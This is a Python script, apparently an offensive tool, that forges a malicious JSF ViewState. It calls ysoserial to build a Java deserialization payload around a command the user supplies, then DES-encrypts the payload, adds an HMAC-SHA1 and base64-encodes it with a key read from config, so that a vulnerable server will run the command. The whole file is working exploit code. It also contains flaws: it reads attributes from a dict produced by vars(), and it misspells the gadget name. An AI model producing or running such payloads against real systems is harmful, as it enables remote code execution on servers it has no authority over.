from base64 import b64decode, b64encode
from pyDes import des
from hashlib import sha1
from hmac import digest
from subprocess import PIPE, Popen
from shlex import split
from argparse import ArgumentParser
import config

#key_bytes = bytes(key, 'utf-8')
#d = des(key,0, padmode=PAD_PKCS5)
#hmac_sha1 = hmac.digest(key_bytes, viewstate, sha1)
#viewstate = viewstate + hmac_sha1
#encrypted_payload = b64encode(d.encrypt(viewstate))


def generate_payload(payload_type: str, command: str) -> bytes:
    payload_generator = "java -jar ysoserial.jar %s '%s'" % (payload_type, command)
    process = Popen(split(payload_generator), stdout=PIPE, stderr=PIPE)
    viewstate, _ = process.communicate()
    if isinstance(viewstate, str):
        viewstate = bytes(viewstate, 'utf-8')
    return viewstate

def encrypt_viewstate(viewstate: bytes) -> str:
    key = bytes(config.ENCRYPTION_CONFIG['key'], 'utf-8')
    d = des(key, config.ENCRYPTION_CONFIG['mode'])
    encrypted_viewstate = d.encrypt(viewstate)
    hmac_sha1 = digest(key, encrypted_viewstate, sha1)
    encrypted_viewstate = b64encode(encrypted_viewstate + hmac_sha1).decode('utf-8')
    return encrypted_viewstate

def main():
    parser = ArgumentParser(description='Create ysoserial payload and encrypt it using a key')
    parser.add_argument('-t', '--type', nargs = '?', const = 'CommonsCollection5', type = str, default = 'CommonsCollection5', help = "type of the payload generated by ysoserial")
    parser.add_argument('-c', '--command', type=str, required=True, help="payload to be generated by ysoserial")
    args = vars(parser.parse_args())

    payload = generate_payload(args.type, args.command)
    encrypted_payload = encrypt_viewstate(payload)
    print("\nYour encrypted payload:\n")
    print(encrypted_payload)

if __name__ == "__main__":
    main()
    